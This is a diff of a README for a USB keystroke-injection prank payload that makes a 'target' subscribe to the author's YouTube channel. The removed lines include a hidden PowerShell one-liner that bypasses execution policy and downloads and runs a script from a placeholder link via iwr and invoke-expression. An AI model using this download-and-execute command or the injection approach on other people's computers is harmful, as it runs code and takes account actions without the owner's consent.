@@ -19,17 +19,13 @@ A script I put together to make your target subscribe to your youtube channel
 
 ## Description
 
-This script is set to run with 2 different methods.  
-Either you use straight keystroke injection with no dependencies 
-Or you use an Invoke-WebRequest to download and execute a powershell script that will do the same thing 
-(With the powershell script you have the ability to modify it and add other actions)
-Either way your target will be directed to your youtube page where they will be made to subscribe to you
+This script is set to use powershell to open your youtube page in their browser where they will be prompted to follow you.
+SPOILER: They will.
 
 ## Getting Started
 
 ### Dependencies
 
-* DropBox or other file hosting service - Your Shared link for the intended file
 * Windows 10,11
 * Your target will have to be signed into their youtube account
 
@@ -38,12 +34,7 @@ Either way your target will be directed to your youtube page where they will be 
 ### Executing program
 
 * Plug in your device
-* Either a straight keystroke injection will be used
-* OR
-* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
-```
-powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link for the intended file> ?dl=1; invoke-expression $pl
-```
+* A one liner command in the run box will execute the script on the bash bunny
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
